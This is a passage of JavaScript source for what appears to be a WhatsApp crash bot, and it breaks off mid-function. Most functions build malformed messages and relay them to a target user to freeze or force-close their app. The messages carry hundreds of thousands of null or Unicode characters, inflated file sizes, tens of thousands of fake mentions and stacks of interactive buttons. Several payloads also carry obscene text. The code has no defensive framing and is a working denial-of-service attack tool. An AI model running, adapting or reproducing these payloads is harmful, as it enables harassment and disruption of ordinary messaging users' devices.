        await FBiphone(target);
        await VenCrash(target);
        await AppXCrash(target);
        await SmCrash(target);
        await SqCrash(target);
        await IosMJ(target, true);
        await XiosVirus(target);
      }
      console.log(
        chalk.red.bold(
          `Wanna With Yours :)!`
        )
      );
    }
    async function sendOfferCall(target) {
    try {
        await cay.offerCall(target);
        console.log(chalk.white.bold(`Success Send Offer Call To Target`));
    } catch (error) {
        console.error(chalk.white.bold(`Failed Send Offer Call To Target:`, error));
    }
}
async function delayforceMessage(target) {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
              contextInfo: {
              stanzaId: cay.generateMessageTag(),
              participant: "0@s.whatsapp.net",
              quotedMessage: {
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                        fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                        fileLength: "9999999999999",
                        pageCount: 35675873277,
                        mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                        fileName: " Caywzz Aja 🌠⃔͒⃰   ",
                        fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                        directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1735456100",
                        contactVcard: true,
                        caption: " Caywzz Aja 🌠⃔͒⃰   "
                    },
                },
              },
            body: {
              text: " Caywzz Aja 🌠⃔͒⃰   " + "ꦾ".repeat(10000)
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "cta_url",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "cta_call",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "cta_copy",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "cta_reminder",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "cta_cancel_reminder",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "address_message",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "send_location",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "quick_reply",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "mpm",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
              ],
            },
          },
        },
      },
    };
    await cay.relayMessage(target, message, {
      participant: { jid: target },
    });
  }
  
    async function xfrix(target){
const buttoncrash = {
quotedMessage: {
buttonsMessage: {
documentMessage: {
url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
fileLength: "9999999999999",
pageCount: 3567587327,
mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
fileName: "Caywzz - Starevxz",
fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
mediaKeyTimestamp: "1735456100",
//contactVcard: true,
caption: "\n"
},
contentText: "Caywzz - Starevxz",
footerText: "\u0000".repeat(850000),
buttons: [{
buttonId: "Caywzz - Starevxz",
buttonText: {
displayText: "𐎟"
},
type: 1
}],
headerType: 3
}
}}
await cay.relayMessage(target, {
viewOnceMessage: {
message: {
listResponseMessage: {
title: '\u0000'.repeat(0),
listType: 1,
"singleSelectReply": {"selectedRowId": "id",},
"description": "oi",
"contextInfo": {
"businessOwnerJid": "5511954801380@s.whatsapp.net",
"participant": "13135550002@s.whatsapp.net",
"mentionedJid": `Caywzz - Starevxz` || [from],
"quotedMessage": buttoncrash.quotedMessage,
},
}}}}, {participant: { jid: target }})
 }
 
  async function xfrixbeta(target) {
		await cay.relayMessage(target, {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2,
                        },
                        interactiveMessage: {
                            body: {
                                text: " Caywzz - Starevxz ",
                            },
                            nativeFlowMessage: {
                                buttons: [
                                    { name: "single_select", buttonParamsJson: "" },
                                    { name: "call_permission_request", buttonParamsJson: "" },
                                    { name: "mpm", buttonParamsJson: "" },
                                    { name: "mpm", buttonParamsJson: "" },
                                    { name: "mpm", buttonParamsJson: "" },
                                    { name: "mpm", buttonParamsJson: "" },
                                ]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });
            }
            async function InvisibleCaywzz(target, msg, Ptcp = true) {
    await cay.relayMessage(target, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2,
                },
                interactiveMessage: {
                    body: {
                        text: "Caywzz - Starevxz",
                    },
                    nativeFlowMessage: {
                        buttons: [
                            { name: "single_select", buttonParamsJson: "" },
                            { name: "call_permission_request", buttonParamsJson: "" },
                            { name: "mpm", buttonParamsJson: "" },
                            { name: "mpm", buttonParamsJson: "" },
                            { name: "mpm", buttonParamsJson: "" },
                            { name: "mpm", buttonParamsJson: "" }
                        ]
                    }
                }
            }
        }
    });

    await cay.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
    });

    if (target) {
        await cay.relayMessage(target, {
            groupStatusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25,
                    },
                },
            },
        });
    }
}
            async function DelayInVis(target) {
            let push = [];
                push.push({
                    body: proto.Message.InteractiveMessage.Body.fromObject({ text: " " }),
                    footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: " " }),
                    header: proto.Message.InteractiveMessage.Header.fromObject({
                        title: " ",
                        hasMediaAttachment: true,
                        imageMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/jpeg",
                            fileSha256: "88J5mAdmZ39jShlm5NiKxwiGLLSAhOy0gIVuesjhPmA=",
                            fileLength: "18352",
                            height: 720,
                            width: 1280,
                            mediaKey: "Te7iaa4gLCq40DVhoZmrIqsjD+tCd2fWXFVl3FlzN8c=",
                            fileEncSha256: "w5CPjGwXN3i/ulzGuJ84qgHfJtBKsRfr2PtBCT0cKQQ=",
                            directPath: "/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1737281900",
                            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACgASAMBIgACEQEDEQH/xAAsAAEBAQEBAAAAAAAAAAAAAAAAAwEEBgEBAQEAAAAAAAAAAAAAAAAAAAED/9oADAMBAAIQAxAAAADzY1gBowAACkx1RmUEAAAAAA//xAAfEAABAwQDAQAAAAAAAAAAAAARAAECAyAiMBIUITH/2gAIAQEAAT8A3Dw30+BydR68fpVV4u+JF5RTudv/xAAUEQEAAAAAAAAAAAAAAAAAAAAw/9oACAECAQE/AH//xAAWEQADAAAAAAAAAAAAAAAAAAARIDD/2gAIAQMBAT8Acw//2Q==",
                            scansSidecar: "hLyK402l00WUiEaHXRjYHo5S+Wx+KojJ6HFW9ofWeWn5BeUbwrbM1g==",
                            scanLengths: [3537, 10557, 1905, 2353],
                            midQualityFileSha256: "gRAggfGKo4fTOEYrQqSmr1fIGHC7K0vu0f9kR5d57eo=",
                        },
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({ buttons: [] }),
                });
        
            let msg = await generateWAMessageFromContent(
                target,
                {
                    viewOnceMessage: {
                        message: {
                            messageContextInfo: {
                                deviceListMetadata: {},
                                deviceListMetadataVersion: 2,
                            },
                            interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                                body: proto.Message.InteractiveMessage.Body.create({ text: " " }),
                                footer: proto.Message.InteractiveMessage.Footer.create({ text: "bijiku" }),
                                header: proto.Message.InteractiveMessage.Header.create({ hasMediaAttachment: false }),
                                carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({ cards: [...push] }),
                            }),
                        },
                    },
                },
                {}
            );
        
            await cay.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [target],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    {
                                        tag: "to",
                                        attrs: { jid: target },
                                        content: undefined,
                                    },
                                ],
                            },
                        ],
                    },
                ],
            });
        
            if (target) {
                await cay.relayMessage(
                    target,
                    {
                        groupStatusMentionMessage: {
                            message: {
                                protocolMessage: {
                                    key: msg.key,
                                    type: 25,
                                },
                            },
                        },
                    },
                    {
                        additionalNodes: [
                            {
                                tag: "meta",
                                attrs: { is_status_mention: "Cay Invisible!" },
                                content: undefined,
                            },
                        ],
                    }
                );
            }
        }
                        async function DelayMakerOverload(target, ptcp = true) {
    await cay.relayMessage(target, {
        stickerMessage: {
            url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
            fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
            fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
            mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
            mimetype: "image/webp",
            height: 9999,
            width: 9999,
            directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
            fileLength: "12260",
            mediaKeyTimestamp: "1743832131",
            isAnimated: false,
            stickerSentTs: "X",
            isAvatar: false,
            isAiSticker: false,
            isLottie: false,
            contextInfo: {
                remoteJid: "X",
                participant: "0@s.whatsapp.net",
                stanzaId: "1234567890ABCDEF",
                quotedMessage: {
                    paymentInviteMessage: {
                        serviceType: 3,
                        expiryTimestamp: Date.now() + 1814400000
                    }
                },
                mentionedJid: [
                    "6289673110783@s.whatsapp.net",
                    ...Array.from({ length: 25000 }, () =>
                        `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                    )
                ]
            }
        }
    }, { participant: { jid: target } });
}
async function VampBroadcast(target, mention = true) { // Default true biar otomatis nyala
    const delaymention = Array.from({ length: 30000 }, (_, r) => ({
        title: "᭡꧈".repeat(92000) + "ꦽ".repeat(92000) + "\u0000".repeat(92000),
        rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
    }));

    const MSG = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "Vampire Here",
                    listType: 2,
                    buttonText: null,
                    sections: delaymention,
                    singleSelectReply: { selectedRowId: "🔴" },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => 
                            "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                        ),
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "333333333333@newsletter",
                            serverMessageId: 1,
                            newsletterName: "-"
                        }
                    },
                    description: "Dont Bothering Me Bro!!!"
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    };

    const msg = generateWAMessageFromContent(target, MSG, {});

    await cay.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    // **Cek apakah mention true sebelum menjalankan relayMessage**
    if (mention) {
        await cay.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "Vampire Here Bro" },
                        content: undefined
                    }
                ]
            }
        );
    }
}
async function SendInteractiveOverload(target, ptcp = true) {
                            await cay.relayMessage(target, {
                            viewOnceMessage: {
                                message: {
                                    interactiveResponseMessage: {
                                        body: {
                                            text: "Well, Looks",
                                            format: "DEFAULT"
                                        },
                                        nativeFlowResponseMessage: {
                                            name: "call_permission_message",
                                            paramsJson: "\u0000".repeat(1000000),
                                            version: 2
                                        }
                                    }
                                }
                            }
                        }, {
                            participant: {
                                jid: target
                            }
                        })
                    }
                async function EpHemeral(target, ptcp = true) {
            let msg = await generateWAMessageFromContent(target, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "caywzzajala",
                                hasMediaAttachment: false
                            },
                            body: {
                                text: ""
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "",
                                buttons: [{
                                        name: "cta_url",
                                        buttonParamsJson: "*我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹*"
                                    },
                                    {
                                        name: "call_permission_request",
                                        buttonParamsJson: "*我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹*"
                                    }
                                ]
                            }
                        }
                    }
                }
            }, {});            
            await cay.relayMessage(target, msg.message, ptcp ? {
				participant: {
					jid: target
				}
			} : {});
            console.log(chalk.green("CaywzzAjala"));
        }
        async function invob(target) {
    let message = {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 3,
                },
                interactiveMessage: {
                    contextInfo: {
                        mentionedJid: [target],
                        isForwarded: true,
                        forwardingScore: 99999999,
                        businessMessageForwardInfo: {
                            businessOwnerJid: target,
                        },
                    },
                    body: {
                        text: "🩸𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟ ▾" + "꧀".repeat(100000),
                    },
                    nativeFlowMessage: {
                        buttons: [{
                                name: "single_select",
                                buttonParamsJson: "",
                            },
                            {
                                name: "call_permission_request",
                                buttonParamsJson: "",
                            },
                            {
                                name: "mpm",
                                buttonParamsJson: "",
                            },
                        ],
                    },
                },
            },
        },
    };

    await cay.relayMessage(target, message, {
        participant: {
            jid: target
        },
    });
    console.log(chalk.yellow('OverLoad Flooding'));
}



const venomModsData = JSON.stringify({
  status: true,
  criador: "Caywzz",
  resultado: {
    type: "md",
    ws: {
      _events: {
        "CB:ib,,dirty": ["Array"]
      },
      _eventsCount: 80000,
      _maxListeners: 0,
      url: "wss://web.whatsapp.com/ws/chat",
      config: {
        version: ["Array"],
        browser: ["Array"],
        waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
        sockCectTimeoutMs: 2000,
        keepAliveIntervalMs: 30000,
        logger: {},
        printQRInTerminal: false,
        emitOwnEvents: true,
        defaultQueryTimeoutMs: 6000,
        customUploadHosts: [],
        retryRequestDelayMs: 250,
        maxMsgRetryCount: 5,
        fireInitQueries: true,
        auth: { Object: "authData" },
        markOnlineOnsockCect: true,
        syncFullHistory: true,
        linkPreviewImageThumbnailWidth: 192,
        transactionOpts: { Object: "transactionOptsData" },
        generateHighQualityLinkPreview: false,
        options: {},
        appStateMacVerification: { Object: "appStateMacData" },
        mobile: true
      }
    }
  }
});
async function CarouselXml(target, QBug, ptcp = true) {
  const haxxn = 10;
  const push = [];

  for (let i = 0; i < haxxn; i++) {
    push.push({
      body: {
        text: `\u0000\u0000\u0000\u0000\u0000`
      },
      footer: {
        text: ""
      },
      header: {
        title: '🌸 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟\u0000\u0000\u0000\u0000',
        hasMediaAttachment: true,
        imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
          mimetype: "image/jpeg",
          fileSha256: "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
          fileLength: "591",
          height: 0,
          width: 0,
          mediaKey: "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
          fileEncSha256: "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
          directPath: "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1721344123",
          jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAArAAADAQAAAAAAAAAAAAAAAAAAAQMCAQEBAQAAAAAAAAAAAAAAAAAAAgH/2gAMAwEAAhADEAAAAMSoouY0VTDIss//xAAeEAACAQQDAQAAAAAAAAAAAAAAARECEHFBUv/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z",
          scansSidecar: "igcFUbzFLVZfVCKxzoSxcDtyHA1ypHZWFFFXGe+0gV9WCo/RLfNKGw==",
          scanLengths: [247, 201, 73, 63],
          midQualityFileSha256: "qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro="
        }
      },
      nativeFlowMessage: {
        buttons: []
      }
    });
  }

  const carousel = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          body: {
            text: '\u0000\u0000\u0000\u0000'
          },
          footer: {
            text: "🦠 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟"
          },
          header: {
            hasMediaAttachment: false
          },
          carouselMessage: {
            cards: push
          }
        }
      }
    }
  }, {
    quoted: QBug // quoted dimasukkan di sini
  });

  await cay.relayMessage(target, carousel.message, {
    messageId: carousel.key.id
  });
}
        async function EpUi(target, ptcp = true) {
            let msg = await generateWAMessageFromContent(X, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "CaywzzAjaa",
                                hasMediaAttachment: false
                            },
                            body: {
                                text: "*我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹*" + "ꦾ".repeat(50000),
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "",
                                buttons: [{
                                        name: "cta_url",
                                        buttonParamsJson: "*我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹*"
                                    },
                                    {
                                        name: "call_permission_request",
                                        buttonParamsJson: "*我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹*"
                                    }
                                ]
                            }
                        }
                    }
                }
            }, {});            
            await cay.relayMessage(target, msg.message, ptcp ? {
				participant: {
					jid: target
				}
			} : {});
            console.log(chalk.green("Send Bug By GetsuzoZhiro🐉"));
        }
        const GetsuVoidsTravasX = JSON.stringify({
  status: true,
  criador: "Caywzz",
  resultado: {
    type: "md",
    ws: {
      _events: {
        "CB:ib,,dirty": ["Array"]
      },
      _eventsCount: 80000,
      _maxListeners: 0,
      url: "wss://web.whatsapp.com/ws/chat",
      config: {
        version: ["Array"],
        browser: ["Array"],
        waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
        sockCectTimeoutMs: 2000,
        keepAliveIntervalMs: 30000,
        logger: {},
        printQRInTerminal: false,
        emitOwnEvents: true,
        defaultQueryTimeoutMs: 6000,
        customUploadHosts: [],
        retryRequestDelayMs: 250,
        maxMsgRetryCount: 5,
        fireInitQueries: true,
        auth: { Object: "authData" },
        markOnlineOnsockCect: true,
        syncFullHistory: true,
        linkPreviewImageThumbnailWidth: 192,
        transactionOpts: { Object: "transactionOptsData" },
        generateHighQualityLinkPreview: false,
        options: {},
        appStateMacVerification: { Object: "appStateMacData" },
        mobile: true
      }
    }
  }  
});
async function InvisibleForceClose(target) {
  try {
    let messageObject = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "🦠 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟ X 𝗞𝗲͜͠𝗲𝗹͢𝗦𝗲̌𝗫 X —Jayy ",
              hasMediaAttachment: false
            },
            body: {
              text: "\u0003".repeat(9000)
            },
            nativeFlowMessage: {
              messageParamsJson: "",
              buttons: [
                "single_select",
                "payment_method",
                "call_permission_request",
                "form_message",
                "wa_payment_learn_more",
                "wa_payment_transaction_details",
                "wa_payment_fbpin_reset",
                "catalog_message",
                "payment_info",
                "review_order",
                "send_location",
                "payments_care_csat",
                "view_product",
                "payment_settings",
                "address_message",
                "automated_greeting_message_view_catalog",
                "open_webview",
                "message_with_link_status",
                "payment_status",
                "galaxy_costum",
                "extensions_message_v2",
                "landline_call",
                "mpm",
                "cta_copy",
                "cta_url",
                "review_and_pay",
                "galaxy_message",
                "cta_call"
              ].map(name => ({
                name,
                buttonParamsJson: GetsuVoidsTravasX + "\u0003"
              }))
            }
          }
        }
      }
    }, {});

    await cay.relayMessage(target, messageObject.message, {
      messageId: messageObject.key.id,
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{ tag: "info", attrs: { sender: target }, content: undefined }]
      }]
    });

    console.log(chalk.red('Succes Send Combo'));
  } catch (err) {
    console.log(err);
    await cay.sendMessage(target, { text: "Error: " + err.message });
  }
}

async function ForceCloseOverButton(target) {
    cay.relayMessage(
        target,
        {
            interactiveMessage: {
                header: {
                    title: "🦠 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟ X 𝗞𝗲͜͠𝗲𝗹͢𝗦𝗲̌𝗫 X —Jayy ",
                    hasMediaAttachment: false
                },
                body: {
                    text: "\u0003".repeat(9000),
                },
                nativeFlowMessage: {
                    messageParamsJson: "",
                    buttons: [
         { name: "single_select", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
         { name: "payment_method", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
         { name: "call_permission_request", buttonParamsJson: GetsuVoidsTravasX + "\u0003", voice_call: "call_galaxy" },
         { name: "form_message", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
         { name: "wa_payment_learn_more", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
         { name: "wa_payment_transaction_details", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
         { name: "wa_payment_fbpin_reset", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
         { name: "catalog_message", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
         { name: "payment_info", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
         { name: "review_order", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
         { name: "send_location", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
         { name: "payments_care_csat", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
         { name: "view_product", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
         { name: "payment_settings", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
         { name: "address_message", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
         { name: "automated_greeting_message_view_catalog", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
         { name: "open_webview", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
         { name: "message_with_link_status", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
         { name: "payment_status", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
         { name: "galaxy_costum", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
         { name: "extensions_message_v2", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
         { name: "landline_call", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
         { name: "mpm", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
         { name: "cta_copy", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
         { name: "cta_url", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
         { name: "review_and_pay", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
         { name: "galaxy_message", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
         { name: "cta_call", buttonParamsJson: GetsuVoidsTravasX + "\u0003" }
        ]
       }
      }
    },
  { participant: { jid: target } }
 );
 console.log(chalk.red('Succes Send Combo'));
}
async function andros(target) {
   let message = {
   viewOnceMessage: {
   message: {
   messageContextInfo: {
   deviceListMetadata: {},
   deviceListMetadataVersion: 3,
   },
   interactiveMessage: {
   contextInfo: {
   mentionedJid: [target],
   isForwarded: true,
   forwardingScore: 99999999,
   businessMessageForwardInfo: {
   businessOwnerJid: target,
   },
   },
   body: {
   text: "🦠 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟ X 𝗞𝗲͜͠𝗲𝗹͢𝗦𝗲̌𝗫 X —Jayy " + "꧀".repeat(100000),
   },
   nativeFlowMessage: {
   buttons: [{
   name: "single_select",
   buttonParamsJson: "",
   },
   {
   name: "call_permission_request",
   buttonParamsJson: "",
   },
   {
   name: "mpm",
   buttonParamsJson: "",
   },
   ],
   },
   },
   },
   },
   };
   await cay.relayMessage(target, message, {
   participant: {
   jid: target
   },
   });
   console.log(chalk.yellow('Caywzz'));
   }
   
   
   


        async function TrashProtocol(target, mention) {
                const sex = Array.from({ length: 9741 }, (_, r) => ({
                       title: "꧀".repeat(9741),
                           rows: [`{ title: ${r + 1}, id: ${r + 1} }`]
                             }));
                             
                             const MSG = {
                             viewOnceMessage: {
                             message: {
                             listResponseMessage: {
